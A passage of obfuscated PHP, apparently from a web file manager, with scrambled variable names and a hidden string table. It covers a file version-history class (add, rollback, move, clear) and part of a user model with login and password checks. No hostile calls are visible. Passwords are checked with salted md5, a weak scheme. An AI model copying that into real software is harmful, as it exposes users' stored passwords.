($œùå·–÷[$íãÆ˜ñ[1217]] <= 0) { return; } if (isset($_REQUEST[$íãÆ˜ñ[1218]]) && $_REQUEST[$íãÆ˜ñ[1218]] == $íãÆ˜ñ[88]) { return; } Hook::bind($íãÆ˜ñ[1219], $íãÆ˜ñ[1220]); Hook::bind($íãÆ˜ñ[1221], $íãÆ˜ñ[1222]); Hook::bind($íãÆ˜ñ[1223], $íãÆ˜ñ[1224]); Hook::bind($íãÆ˜ñ[1225], $íãÆ˜ñ[1226]); Hook::bind($íãÆ˜ñ[1227], $íãÆ˜ñ[1228]); Hook::bind($íãÆ˜ñ[1229], $íãÆ˜ñ[1230]); } public static function eventBeforeUpload($Ø¾Üäşí) { if ($Ø¾Üäşí[3] && $Ø¾Üäşí[3] != REPEAT_REPLACE) { return; } $ìÆÅ©Ñğ = self::parsePath($Ø¾Üäşí[0]); if (!$ìÆÅ©Ñğ) { return; } self::add($ìÆÅ©Ñğ); } public static function eventBeforeEdit($„™¾Î±©) { $Œ¸ğ‚Ó = self::parsePath($„™¾Î±©[0]); if (!$Œ¸ğ‚Ó) { return; } self::add($Œ¸ğ‚Ó); } public static function eventBeforeCopyFile($¦¼´”æ, $§ÆñÍŠ˜, $³Òµ¶¨, $ğ“½ìäÀ, $¶Û´‘Ö, $Üà…ÁïÇ) { $«’Üò =& $_SERVER[™¾ÇÙ¯¹]; if (isset($³Òµ¶¨->_data[$«’Üò[1163]]) && $³Òµ¶¨->_data[$«’Üò[1163]]) { return; } $¢É¨Ï‹² = $³Òµ¶¨->getPathOuter($ğ“½ìäÀ); $Ï™ù”áÚ = self::parsePath($¢É¨Ï‹²); if (!$Ï™ù”áÚ) { return; } self::add($Ï™ù”áÚ); } public static function eventBeforeRename($µëÌı¹Œ) { $–—åÈÙ° =& $_SERVER[™¾ÇÙ¯¹]; $¿¬©´ü  = self::parsePath($µëÌı¹Œ[0]); if (!$¿¬©´ü ) { return; } $äŸ¸œÅÊ = self::checkInHistory($¿¬©´ü ); if (!$äŸ¸œÅÊ) { return; } if ($äŸ¸œÅÊ[$–—åÈÙ°[33]] == $–—åÈÙ°[199]) { $õÜÄ‡ô© = self::listData($¿¬©´ü ); if ($õÜÄ‡ô© && $õÜÄ‡ô©[$–—åÈÙ°[378]]) { self::moveHistory($¿¬©´ü , $µëÌı¹Œ[1]); } } else { IO::rename($äŸ¸œÅÊ[$–—åÈÙ°[84]], $µëÌı¹Œ[1]); } } public static function eventBeforeMove($Àò·ÍÌ) { $§Œ²êÂÀ =& $_SERVER[™¾ÇÙ¯¹]; $ôã÷†ûÆ = self::parsePath($Àò·ÍÌ[0]); if (!$ôã÷†ûÆ) { return; } $ãô˜ˆÍñ = self::parsePath($Àò·ÍÌ[1]); if (!$ãô˜ˆÍñ) { return; } $¯éÑÛÉƒ = $Àò·ÍÌ[3]; $åº„—Œ = self::checkInHistory($ôã÷†ûÆ); if (!$åº„—Œ) { return; } $®Ø¢ƒÁ = self::pathHistory($ãô˜ˆÍñ); if ($åº„—Œ[$§Œ²êÂÀ[33]] == $§Œ²êÂÀ[199]) { $ ß¸‚”ë = self::listData($ôã÷†ûÆ); $àŒ£‹‡ˆ = rtrim($ãô˜ˆÍñ, $§Œ²êÂÀ[8]) . $§Œ²êÂÀ[8] . ($¯éÑÛÉƒ ? $¯éÑÛÉƒ : get_path_this($ôã÷†ûÆ)); $ûˆÌÅÂ› = self::listData($àŒ£‹‡ˆ); if ($ ß¸‚”ë && $ ß¸‚”ë[$§Œ²êÂÀ[378]] && $ûˆÌÅÂ› && $ûˆÌÅÂ›[$§Œ²êÂÀ[378]]) { return self::clear($ôã÷†ûÆ); } if ($ ß¸‚”ë && $ ß¸‚”ë[$§Œ²êÂÀ[378]]) { self::moveHistory($ôã÷†ûÆ, $¯éÑÛÉƒ, $®Ø¢ƒÁ); } } else { IO::move($åº„—Œ[$§Œ²êÂÀ[84]], $®Ø¢ƒÁ, !1, $¯éÑÛÉƒ); self::clearEmptyFolder(IO::pathFather($åº„—Œ[$§Œ²êÂÀ[84]])); } } public static function eventAfterRemove($áğ´„€¼, $‘í¼©Œü) { $ûàîÕÓ =& $_SERVER[™¾ÇÙ¯¹]; if (!$‘í¼©Œü) { return; } $µ¢®™¹Ï = self::parsePath($áğ´„€¼[0]); if (!$µ¢®™¹Ï) { return; } $ƒ”’™¹È = self::checkInHistory($µ¢®™¹Ï); if (!$ƒ”’™¹È) { return; } if ($ƒ”’™¹È[$ûàîÕÓ[33]] == $ûàîÕÓ[199]) { $í½ò§ûï = self::listData($µ¢®™¹Ï, !1); if ($í½ò§ûï && $í½ò§ûï[$ûàîÕÓ[378]]) { self::clear($µ¢®™¹Ï, !1); } } else { IO::remove($ƒ”’™¹È[$ûàîÕÓ[84]]); self::clearEmptyFolder(IO::pathFather($ƒ”’™¹È[$ûàîÕÓ[84]])); } } private static function checkInHistory($„•Æì™­) { $©çÕ”Œ½ = self::pathHistory($„•Æì™­); if (!IO::exist($©çÕ”Œ½)) { $©çÕ”Œ½ .= $_SERVER[™¾ÇÙ¯¹][1231]; } return IO::exist($©çÕ”Œ½) ? IO::info($©çÕ”Œ½) : !1; } private static function parsePath($É¼µöŒ¬) { $ÆÊäÃ =& $_SERVER[™¾ÇÙ¯¹]; if (!$É¼µöŒ¬) { return !1; } if ($GLOBALS[$ÆÊäÃ[1232]]) { return; } $Õİö´ë¹ = KodIO::parse($É¼µöŒ¬); $¥•ÁïÁä = $Õİö´ë¹[$ÆÊäÃ[33]]; $“é™—¼„ = !$¥•ÁïÁä || $¥•ÁïÁä == KodIO::KOD_IO || $¥•ÁïÁä == KodIO::KOD_SHARE_ITEM; if (!$“é™—¼„ || !$Õİö´ë¹[$ÆÊäÃ[1233]]) { return !1; } if (substr($É¼µöŒ¬, 0, strlen(DATA_PATH . $ÆÊäÃ[1234])) == DATA_PATH . $ÆÊäÃ[1234]) { return !1; } if ($¥•ÁïÁä == KodIO::KOD_SHARE_ITEM) { $õË¸›É÷ = IO::init($É¼µöŒ¬); if ($õË¸›É÷->pathParse[$ÆÊäÃ[1159]]) { return self::parsePath($õË¸›É÷->pathParse[$ÆÊäÃ[1159]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Î°Ø«™ş = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÆÊäÃ[1235]); foreach ($Î°Ø«™ş as $€Üú‚–¬) { if (!$¥•ÁïÁä && substr($É¼µöŒ¬, 0, strlen($€Üú‚–¬)) == $€Üú‚–¬) { return !1; } } self::log($GLOBALS[$ÆÊäÃ[1154]] . $ÆÊäÃ[1236] . $É¼µöŒ¬); return $É¼µöŒ¬; } private static function pathHistory($éñÒª•ñ) { $ˆİé…ó© =& $_SERVER[™¾ÇÙ¯¹]; $Ğ©ë¶Ûó = self::$_historyBase . ltrim(KodIO::clear($éñÒª•ñ), $ˆİé…ó©[8]); $Ğ©ë¶Ûó = str_replace(array($ˆİé…ó©[1237]), array($ˆİé…ó©[1238]), $Ğ©ë¶Ûó); return $Ğ©ë¶Ûó; } public static function log($‚Û’Ò‘Ò) { } public static function historyCount($úùµ‘½À) { $ô‡Í¯‘§ =& $_SERVER[™¾ÇÙ¯¹]; $—¶µ•ê­ = array(); $ˆß¹Æ—Ò = array(); foreach ($úùµ‘½À as $ªï÷µï) { $¢ö”Ø§é = get_path_father($ªï÷µï); if (!$ˆß¹Æ—Ò[$¢ö”Ø§é]) { $ˆß¹Æ—Ò[$¢ö”Ø§é] = array(); } $ˆß¹Æ—Ò[$¢ö”Ø§é][] = get_path_this($ªï÷µï); } foreach ($ˆß¹Æ—Ò as $¢ö”Ø§é => $‹ÄÇªäÆ) { $°¸¼ªæ€ = self::parsePath($¢ö”Ø§é); if (!$°¸¼ªæ€) { continue; } foreach ($‹ÄÇªäÆ as $°æ÷«Ğá) { $„“”üá” = self::listData(rtrim($°¸¼ªæ€, $ô‡Í¯‘§[8]) . $ô‡Í¯‘§[8] . $°æ÷«Ğá, !1); if ($„“”üá” && $„“”üá”[$ô‡Í¯‘§[378]]) { $—¶µ•ê­[rtrim($¢ö”Ø§é, $ô‡Í¯‘§[8]) . $ô‡Í¯‘§[8] . $°æ÷«Ğá] = count($„“”üá”[$ô‡Í¯‘§[378]]); } } } return $—¶µ•ê­; } public static function add($É’Î‡å‹) { $‰Š¤‘Ÿ» =& $_SERVER[™¾ÇÙ¯¹]; $òÕº’ = self::listData($É’Î‡å‹); if (!$òÕº’) { return; } $¡ÏááÎğ = Model($‰Š¤‘Ÿ»[785])->get($‰Š¤‘Ÿ»[1239]); $ òğÑê‘ = $GLOBALS[$‰Š¤‘Ÿ»[6]][$‰Š¤‘Ÿ»[89]][$‰Š¤‘Ÿ»[1217]]; $ÊİÆ¶ à = $¡ÏááÎğ == $‰Š¤‘Ÿ»[1240] ? min(5, $ òğÑê‘) : $ òğÑê‘; if ($ òğÑê‘ <= 0) { return; } $ë¡Ù¸Õ = IO::info($É’Î‡å‹); $ıúœŒÀÑ = $òÕº’[$‰Š¤‘Ÿ»[378]]; if ($ë¡Ù¸Õ[$‰Š¤‘Ÿ»[76]] == 0) { return; } if ($ë¡Ù¸Õ[$‰Š¤‘Ÿ»[76]] >= 1024 * 1024 * 500) { return !1; } $ØÂ¡ö‚¡ = IO::hashSimple($É’Î‡å‹); if ($ıúœŒÀÑ && $ıúœŒÀÑ[0][$‰Š¤‘Ÿ»[177]] == $ØÂ¡ö‚¡) { return !0; } if (array_key_exists($‰Š¤‘Ÿ»[202], $ë¡Ù¸Õ) && !$ë¡Ù¸Õ[$‰Š¤‘Ÿ»[202]]) { return !1; } $·¥¤÷‰ = short_id(time()); $Ô›ñˆúú = array($‰Š¤‘Ÿ»[407] => $·¥¤÷‰, $‰Š¤‘Ÿ»[177] => $ØÂ¡ö‚¡, $‰Š¤‘Ÿ»[32] => $ë¡Ù¸Õ[$‰Š¤‘Ÿ»[32]] . $‰Š¤‘Ÿ»[10] . date($‰Š¤‘Ÿ»[1241]) . rand_string(1), $‰Š¤‘Ÿ»[76] => $ë¡Ù¸Õ[$‰Š¤‘Ÿ»[76]], $‰Š¤‘Ÿ»[462] => USER_ID, $‰Š¤‘Ÿ»[200] => time(), $‰Š¤‘Ÿ»[1242] => $‰Š¤‘Ÿ»[12]); IO::mkdir($òÕº’[$‰Š¤‘Ÿ»[1243]]); $¯ˆ‚’µ© = IO::copy($É’Î‡å‹, $òÕº’[$‰Š¤‘Ÿ»[1243]], !1, $Ô›ñˆúú[$‰Š¤‘Ÿ»[32]]); if (!$¯ˆ‚’µ©) { self::clearEmptyFolder($òÕº’[$‰Š¤‘Ÿ»[1243]]); return !1; } array_unshift($ıúœŒÀÑ, $Ô›ñˆúú); if (count($ıúœŒÀÑ) > $ÊİÆ¶ à) { $É§ÖâûÄ = array_slice($ıúœŒÀÑ, $ÊİÆ¶ à); foreach ($É§ÖâûÄ as $§Ôó½æ) { IO::remove($òÕº’[$‰Š¤‘Ÿ»[1243]] . $§Ôó½æ[$‰Š¤‘Ÿ»[32]]); } $ıúœŒÀÑ = array_slice($ıúœŒÀÑ, 0, $ÊİÆ¶ à); } return self::saveData($òÕº’[$‰Š¤‘Ÿ»[1244]], $ıúœŒÀÑ); } public static function remove($ô‡ˆÜ·, $ıÛ¹¸ä‘) { $ó‘¦û¿ =& $_SERVER[™¾ÇÙ¯¹]; $‚ßá½¼Œ = self::listData($ô‡ˆÜ·); $Í›çõ‚Š = array(); if (!$‚ßá½¼Œ) { return !1; } foreach ($‚ßá½¼Œ[$ó‘¦û¿[378]] as $Ô¨ƒ©›È) { if ($Ô¨ƒ©›È[$ó‘¦û¿[407]] == $ıÛ¹¸ä‘) { IO::remove($‚ßá½¼Œ[$ó‘¦û¿[1243]] . $Ô¨ƒ©›È[$ó‘¦û¿[32]]); continue; } $Í›çõ‚Š[] = $Ô¨ƒ©›È; } return self::saveData($‚ßá½¼Œ[$ó‘¦û¿[1244]], $Í›çõ‚Š); } public static function clear($¾½²¤Èô, $†‰šõêŸ = true) { $åç½ÌšÉ =& $_SERVER[™¾ÇÙ¯¹]; $âÃ£Úû = self::listData($¾½²¤Èô, $†‰šõêŸ); if (!$âÃ£Úû) { return !1; } foreach ($âÃ£Úû[$åç½ÌšÉ[378]] as $³¨˜ıšÀ) { IO::remove($âÃ£Úû[$åç½ÌšÉ[1243]] . $³¨˜ıšÀ[$åç½ÌšÉ[32]]); } return self::saveData($âÃ£Úû[$åç½ÌšÉ[1244]], array()); } public static function moveHistory($’ÒÖÛœª, $§ İç´— = '', $¶ÉÜÏ¨Ä = '') { $£‘ëèåî =& $_SERVER[™¾ÇÙ¯¹]; $ß±‡Úø‹ = self::listData($’ÒÖÛœª, !1); if (!$ß±‡Úø‹ || !$ß±‡Úø‹[$£‘ëèåî[378]]) { return !1; } $ÖßÉ®¥ = $£‘ëèåî[1231]; $§ İç´— = $§ İç´— ? $§ İç´— : get_path_this($’ÒÖÛœª); $¶ÉÜÏ¨Ä = $¶ÉÜÏ¨Ä ? $¶ÉÜÏ¨Ä : $ß±‡Úø‹[$£‘ëèåî[1243]]; $’ÍÄ”ªÖ = substr(get_path_this($ß±‡Úø‹[$£‘ëèåî[1244]]), 0, -strlen($ÖßÉ®¥)); foreach ($ß±‡Úø‹[$£‘ëèåî[378]] as $ªÜ‡Ÿ†¯ => $ıĞ‚á÷) { $¿èèñş€ = $§ İç´— . substr($ıĞ‚á÷[$£‘ëèåî[32]], strlen($’ÍÄ”ªÖ)); $èÙšÉ• = IO::move($ß±‡Úø‹[$£‘ëèåî[1243]] . $ıĞ‚á÷[$£‘ëèåî[32]], $¶ÉÜÏ¨Ä, !1, $¿èèñş€); if ($èÙšÉ•) { $ß±‡Úø‹[$£‘ëèåî[378]][$ªÜ‡Ÿ†¯][$£‘ëèåî[32]] = $¿èèñş€; } } $ß±‡Úø‹[$£‘ëèåî[1244]] = IO::move($ß±‡Úø‹[$£‘ëèåî[1244]], $¶ÉÜÏ¨Ä, !1, $§ İç´— . $ÖßÉ®¥); self::saveData($ß±‡Úø‹[$£‘ëèåî[1244]], $ß±‡Úø‹[$£‘ëèåî[378]]); self::clearEmptyFolder($ß±‡Úø‹[$£‘ëèåî[1243]]); } public static function rollback($Şüï’—, $á÷–Ïˆ) { $úè‰œó’ =& $_SERVER[™¾ÇÙ¯¹]; $å»Ê©şö = self::listData($Şüï’—); if (!$å»Ê©şö) { return; } $Òß±¡… = IO::info($Şüï’—); foreach ($å»Ê©şö[$úè‰œó’[378]] as $ÃÙµÎÃù => $ÁÊèÔç®) { if ($ÁÊèÔç®[$úè‰œó’[407]] == $á÷–Ïˆ) { self::add($Şüï’—); $áÄ‚éßÄ = $å»Ê©şö[$úè‰œó’[1243]] . $ÁÊèÔç®[$úè‰œó’[32]]; $û‰Öìª¯ = IO::copy($áÄ‚éßÄ, IO::pathFather($Şüï’—), REPEAT_REPLACE, $Òß±¡…[$úè‰œó’[32]]); if ($û‰Öìª¯) { self::remove($Şüï’—, $á÷–Ïˆ); } return $û‰Öìª¯; } } return !1; } public static function setDetail($…Œâîàß, $µÚ€Ä, $¾À‘é½‚) { $ä‡­”áÀ =& $_SERVER[™¾ÇÙ¯¹]; $ü£Š™ÈĞ = self::listData($…Œâîàß); if (!$ü£Š™ÈĞ) { return; } foreach ($ü£Š™ÈĞ[$ä‡­”áÀ[378]] as $ÜÆÍ¦øª => $ëï•Ÿ–) { if ($ëï•Ÿ–[$ä‡­”áÀ[407]] == $µÚ€Ä) { $ü£Š™ÈĞ[$ä‡­”áÀ[378]][$ÜÆÍ¦øª][$ä‡­”áÀ[1242]] = $¾À‘é½‚; self::saveData($ü£Š™ÈĞ[$ä‡­”áÀ[1244]], $ü£Š™ÈĞ[$ä‡­”áÀ[378]]); return !0; } } return !1; } public static function fileInfo($Æ®’¥¿¤, $õ‹÷Şõ©) { $¾ü¡ç„ê =& $_SERVER[™¾ÇÙ¯¹]; $ğê¢à÷ü = self::listData($Æ®’¥¿¤); if (!$ğê¢à÷ü) { show_json(LNG($¾ü¡ç„ê[105]), !1); } $ü‹ÛÏû = $¾ü¡ç„ê[12]; foreach ($ğê¢à÷ü[$¾ü¡ç„ê[378]] as $±ÙâÖõŸ => $Ä¯£è§) { if ($Ä¯£è§[$¾ü¡ç„ê[407]] != $õ‹÷Şõ©) { continue; } $ü‹ÛÏû = $ğê¢à÷ü[$¾ü¡ç„ê[1243]] . $Ä¯£è§[$¾ü¡ç„ê[32]]; break; } if (!$ü‹ÛÏû) { show_json(LNG($¾ü¡ç„ê[105]), !1); } return IO::info($ü‹ÛÏû); } public static function fileOut($²±¡ÓÉŠ, $Ú–¬®Ûã, $Ğ±¦³Ô™ = false) { $Œö…úò =& $_SERVER[™¾ÇÙ¯¹]; $‘•È¥ = self::fileInfo($²±¡ÓÉŠ, $Ú–¬®Ûã); $úÄè·İâ =& $GLOBALS[$Œö…úò[7]]; $Ğ±¦³Ô™ = isset($úÄè·İâ[$Œö…úò[1207]]) && $úÄè·İâ[$Œö…úò[1207]] == 1; if (isset($úÄè·İâ[$Œö…úò[33]]) && $úÄè·İâ[$Œö…úò[33]] == $Œö…úò[1245]) { return IO::fileOutImage($‘•È¥[$Œö…úò[84]], $úÄè·İâ[$Œö…úò[1246]]); } IO::fileOut($‘•È¥[$Œö…úò[84]], $Ğ±¦³Ô™, get_path_this($²±¡ÓÉŠ)); } public static function listData($â’¿›ç, $æÒ‹àèƒ = true) { $ÆØŒ˜’˜ =& $_SERVER[™¾ÇÙ¯¹]; if ($æÒ‹àèƒ && !IO::exist($â’¿›ç)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($â’¿›ç, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $´£ßÛÖß = self::pathHistory($â’¿›ç); $ƒ²ªöà = array($ÆØŒ˜’˜[1244] => $´£ßÛÖß . $ÆØŒ˜’˜[1231], $ÆØŒ˜’˜[1243] => rtrim(get_path_father($´£ßÛÖß), $ÆØŒ˜’˜[8]) . $ÆØŒ˜’˜[8], $ÆØŒ˜’˜[378] => array()); $ÄñèÇ©£ = IO::getContent($ƒ²ªöà[$ÆØŒ˜’˜[1244]]); if ($ÄñèÇ©£) { $í©ÕåÀË = json_decode($ÄñèÇ©£, !0); if (is_array($í©ÕåÀË)) { $ƒ²ªöà[$ÆØŒ˜’˜[378]] = $í©ÕåÀË; } } return $ƒ²ªöà; } private static function saveData($ÁÄŒö÷¯, $İ„ˆôĞ˜) { $ç¦“üÖµ =& $_SERVER[™¾ÇÙ¯¹]; self::log($ç¦“üÖµ[1247] . $ÁÄŒö÷¯ . $ç¦“üÖµ[71] . count($İ„ˆôĞ˜), $ç¦“üÖµ[767]); if ($İ„ˆôĞ˜) { return IO::setContent($ÁÄŒö÷¯, json_encode($İ„ˆôĞ˜)); } $ÈƒÙ†’¶ = IO::pathFather($ÁÄŒö÷¯); IO::remove($ÁÄŒö÷¯); self::clearEmptyFolder($ÈƒÙ†’¶); return !0; } public static function clearEmptyFolder($©ìò×§) { $› ¤´áÆ =& $_SERVER[™¾ÇÙ¯¹]; if (trim($©ìò×§, $› ¤´áÆ[8]) == trim(self::$_historyBase, $› ¤´áÆ[8])) { return; } $÷ÉŠú™  = IO::pathFather($©ìò×§); $Õ’¾“àô = IO::has($©ìò×§, !0); if ($Õ’¾“àô[$› ¤´áÆ[207]] > 0 || $Õ’¾“àô[$› ¤´áÆ[208]] > 0) { return; } IO::remove($©ìò×§); self::clearEmptyFolder($÷ÉŠú™ ); } private static function getBasePath() { $”Ëßı =& $_SERVER[™¾ÇÙ¯¹]; $¨€õôÚÈ = Model($”Ëßı[1248])->get($”Ëßı[1249]); if ($¨€õôÚÈ) { if (!IO::exist($¨€õôÚÈ)) { IO::mkdir($¨€õôÚÈ); } if (get_path_this($¨€õôÚÈ) == $”Ëßı[1234]) { $¦—á²íÀ = $”Ëßı[1250] . rand_string(8); @rename($¨€õôÚÈ, get_path_father($¨€õôÚÈ) . $”Ëßı[8] . $¦—á²íÀ); $¨€õôÚÈ = DATA_PATH . $¦—á²íÀ . $”Ëßı[8]; file_put_contents(DATA_PATH . $”Ëßı[1251], $”Ëßı[12]); Model($”Ëßı[1248])->set($”Ëßı[1249], $¨€õôÚÈ); } return $¨€õôÚÈ; } $¨€õôÚÈ = DATA_PATH . $”Ëßı[1250] . rand_string(8) . $”Ëßı[8]; $¨€õôÚÈ = IO::mkdir($¨€õôÚÈ); $¨€õôÚÈ = rtrim($¨€õôÚÈ, $”Ëßı[8]) . $”Ëßı[8]; file_put_contents($¨€õôÚÈ . $”Ëßı[1251], $”Ëßı[12]); file_put_contents(DATA_PATH . $”Ëßı[1251], $”Ëßı[12]); Model($”Ëßı[1248])->set($”Ëßı[1249], $¨€õôÚÈ); return $¨€õôÚÈ; } } goto FŒÂàåèõ­; D–ÎšÇùêÆ: class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\x6d\x65" => "\165\x73\145\162\137\155\145\164\141", "\x6d\145\164\x61\106\x69\145\154\x64" => "\165\x73\145\162\111\104"); protected $simpleField = "\x75\x73\145\162\x49\x44\54\x6e\x69\x63\x6b\116\x61\x6d\x65\54\x6e\141\x6d\x65\x2c\x61\x76\141\x74\x61\x72\x2c\x73\145\x78\x2c\x73\164\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ˆÄë…ó) { $ÊİÅˆ§ =& $_SERVER[™¾ÇÙ¯¹]; $Äé˜ò¶â = $ÊİÅˆ§[2282]; return array($ÊİÅˆ§[1915] => array($ˆÄë…ó[0], $Äé˜ò¶â), $ÊİÅˆ§[1917] => array($ˆÄë…ó[0], $Äé˜ò¶â), $ÊİÅˆ§[2283] => array($ˆÄë…ó[0], $Äé˜ò¶â)); } protected function getInfo($…†îãş¦, $›À«ä‘ = false) { $´–‚úö = $this->getInfoSimple($…†îãş¦); if (!is_array($´–‚úö)) { return array(); } if ($›À«ä‘) { return $this->_getInfoApply($´–‚úö); } return $this->cacheFunctionGet($_SERVER[™¾ÇÙ¯¹][1919], $…†îãş¦); } protected function getInfoFull($Ä§¥–ï, $ø°‹Öõ = false) { $–ú…—Ã„ = $this->getInfoSimple($Ä§¥–ï); if (!is_array($–ú…—Ã„)) { return array(); } if ($ø°‹Öõ) { return $this->_getInfoApply($–ú…—Ã„, !0); } return $this->cacheFunctionGet($_SERVER[™¾ÇÙ¯¹][2284], $Ä§¥–ï); } private function _getInfoApply($–‹ªÆÏª, $„†ó‘”½ = false) { $Ü¢ÁşÌÖ =& $_SERVER[™¾ÇÙ¯¹]; if (!$–‹ªÆÏª) { return $–‹ªÆÏª; } $ÊÅğ†ë£ = md5($Ü¢ÁşÌÖ[2285] . $–‹ªÆÏª[$Ü¢ÁşÌÖ[897]] . $Ü¢ÁşÌÖ[2286] . $–‹ªÆÏª[$Ü¢ÁşÌÖ[32]]); $–‹ªÆÏª = $this->_listDataApplyItem($–‹ªÆÏª); $±õ–‘ìæ = Model($Ü¢ÁşÌÖ[1335])->metaGet($–‹ªÆÏª[$Ü¢ÁşÌÖ[86]][$Ü¢ÁşÌÖ[410]]); $–‹ªÆÏª[$Ü¢ÁşÌÖ[2287]] = $ÊÅğ†ë£; $–‹ªÆÏª[$Ü¢ÁşÌÖ[86]][$Ü¢ÁşÌÖ[2106]] = isset($±õ–‘ìæ[$Ü¢ÁşÌÖ[2107]]) ? $±õ–‘ìæ[$Ü¢ÁşÌÖ[2107]] : null; if ($„†ó‘”½) { $–‹ªÆÏª[$Ü¢ÁşÌÖ[474]] = $this->metaGet($–‹ªÆÏª[$Ü¢ÁşÌÖ[1665]]); } return $–‹ªÆÏª; } protected function getInfoSimple($åíÀòÅÅ, $‘°âéö² = false) { $ĞÙÙ¹ˆ° =& $_SERVER[™¾ÇÙ¯¹]; if (!$åíÀòÅÅ) { return array(); } if ($‘°âéö²) { $Á–·©Ã‰ = $this->where(array($ĞÙÙ¹ˆ°[1665] => intval($åíÀòÅÅ)))->find(); if (!is_array($Á–·©Ã‰)) { return array(); } $Á–·©Ã‰[$ĞÙÙ¹ˆ°[551]] = Action($ĞÙÙ¹ˆ°[2288])->parseUrl($Á–·©Ã‰[$ĞÙÙ¹ˆ°[551]]); return $Á–·©Ã‰; } return $this->cacheFunctionGet($ĞÙÙ¹ˆ°[1920], $åíÀòÅÅ); } protected function getInfoSimpleOuter($æÎÑ¼”€) { $Ò°ìö¥È =& $_SERVER[™¾ÇÙ¯¹]; if (!$æÎÑ¼”€ || $æÎÑ¼”€ == 0) { return array($Ò°ìö¥È[1665] => $Ò°ìö¥È[197], $Ò°ìö¥È[32] => $Ò°ìö¥È[162] . LNG($Ò°ìö¥È[2289]) . $Ò°ìö¥È[164], $Ò°ìö¥È[551] => STATIC_PATH . $Ò°ìö¥È[2290]); } $”ú«ãœÉ = $this->cacheFunctionGet($Ò°ìö¥È[1920], $æÎÑ¼”€); $ÂıØÊõ“ = array_field_key($”ú«ãœÉ, explode($Ò°ìö¥È[50], $this->simpleField)); if (!$ÂıØÊõ“) { return array($Ò°ìö¥È[1665] => $Ò°ìö¥È[1198], $Ò°ìö¥È[32] => $Ò°ìö¥È[162] . LNG($Ò°ìö¥È[2291]) . $Ò°ìö¥È[164], $Ò°ìö¥È[551] => STATIC_PATH . $Ò°ìö¥È[2292]); } $ÂıØÊõ“[$Ò°ìö¥È[551]] = Action($Ò°ìö¥È[2288])->parseUrl($ÂıØÊõ“[$Ò°ìö¥È[551]]); return $ÂıØÊõ“; } protected function groupUser($ ©ì£Òø) { } public static function errorLang($šå¼‰®) { $ıï•Êó =& $_SERVER[™¾ÇÙ¯¹]; $¨³ì¬°¦ = array(self::ERROR_USER_NOT_EXISTS => $ıï•Êó[2293], self::ERROR_USER_PASSWORD_ERROR => $ıï•Êó[2294], self::ERROR_USER_EXIST_NAME => $ıï•Êó[2295], self::ERROR_USER_EXIST_PHONE => $ıï•Êó[2296], self::ERROR_USER_EXIST_EMAIL => $ıï•Êó[2297], self::ERROR_USER_LOGIN_LOCK => $ıï•Êó[2298], self::ERROR_IP_NOT_ALLOW => $ıï•Êó[2299], self::ERROR_USER_EXIST_NICKNAME => $ıï•Êó[2300]); return LNG($¨³ì¬°¦[$šå¼‰®]); } public function getInfoByMeta($îËöß¦â, $â÷²¼¿) { $¡à‹ƒß‡ =& $_SERVER[™¾ÇÙ¯¹]; $ÅÃœ¢Î… = Model($¡à‹ƒß‡[2301])->where(array($¡à‹ƒß‡[94] => $îËöß¦â, $¡à‹ƒß‡[383] => $â÷²¼¿))->find(); if ($ÅÃœ¢Î…) { return $this->getInfo($ÅÃœ¢Î…[$¡à‹ƒß‡[1665]]); } return !1; } public function userLoginCheck($¶µšõ¾, $Ç ô´ß) { $›Ê¦îÊé =& $_SERVER[™¾ÇÙ¯¹]; $ÜÇˆ†¼¡ = $this->userLoginFind($¶µšõ¾); if (!$ÜÇˆ†¼¡) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÜÇˆ†¼¡[$›Ê¦îÊé[1665]], $Ç ô´ß)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÜÇˆ†¼¡[$›Ê¦îÊé[1665]]); } public function userLoginFind($ö–¶›Ï) { $£èÚú =& $_SERVER[™¾ÇÙ¯¹]; $ıÈ½êå‚ = array($£èÚú[32] => $ö–¶›Ï, $£èÚú[550] => $ö–¶›Ï, $£èÚú[314] => $ö–¶›Ï, $£èÚú[2302] => $ö–¶›Ï, $£èÚú[1008] => $£èÚú[1010]); if ($this->nickNameRpt()) { unset($ıÈ½êå‚[$£èÚú[550]]); } return $this->where($ıÈ½êå‚)->find(); } public function clearCache($óŠ¦‚÷÷) { $àäñ÷¨ç =& $_SERVER[™¾ÇÙ¯¹]; $this->cacheFunctionClear($àäñ÷¨ç[1919], $óŠ¦‚÷÷); $this->cacheFunctionClear($àäñ÷¨ç[1920], $óŠ¦‚÷÷); $this->cacheFunctionClear($àäñ÷¨ç[2284], $óŠ¦‚÷÷); } public function userPasswordCheck($ïéÖ‰îÜ, $ë¡ÖÄúÃ) { $ğë¢Ÿç· =& $_SERVER[™¾ÇÙ¯¹]; $ºıù©ã = $this->where(array($ğë¢Ÿç·[1665] => intval($ïéÖ‰îÜ)))->find(); $Èã‰¨èµ = $this->metaGet($ïéÖ‰îÜ); $â²›úÊÊ = isset($Èã‰¨èµ[$ğë¢Ÿç·[2303]]) ? $Èã‰¨èµ[$ğë¢Ÿç·[2303]] : $ğë¢Ÿç·[12]; if (md5($â²›úÊÊ . trim($ë¡ÖÄúÃ)) !== $ºıù©ã[$ğë¢Ÿç·[897]]) { return !1; } return !0; } public function userAdd($ï©òıÕ®) { $‚á˜±‘€ =& $_SERVER[™¾ÇÙ¯¹]; $„Œ³İÁê = array($‚á˜±‘€[428] => $ï©òıÕ®[$‚á˜±‘€[32]], $‚á˜±‘€[2304] => $ï©òıÕ®[$‚á˜±‘€[1544]], $‚á˜±‘€[2305] => isset($ï©òıÕ®[$‚á˜±‘€[314]]) ? $ï©òıÕ®[$‚á˜±‘€[314]] : $‚á˜±‘€[12], $‚á˜±‘€[2306] => isset($ï©òıÕ®[$‚á˜±‘€[2302]]) ? $ï©òıÕ®[$‚á˜±‘€[2302]] : 